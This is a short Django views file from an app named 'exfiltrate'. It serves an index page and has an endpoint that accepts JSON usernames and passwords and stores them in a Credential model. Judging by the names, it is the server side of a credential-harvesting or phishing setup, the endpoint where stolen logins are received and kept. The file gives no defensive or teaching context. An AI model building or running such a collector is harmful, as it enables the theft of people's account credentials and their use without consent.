import json

from django.http import HttpResponse
from django.template import loader

from exfiltrate.models import Credential


def index(request):
    template = loader.get_template('exfiltrate/index.html')
    return HttpResponse(template.render({}, request))


def exfiltrate(request):
    cred_json = json.loads(request.body)
    cred = Credential(username=cred_json['username'], password=cred_json['password'])
    cred.save()
    return HttpResponse(status=204)
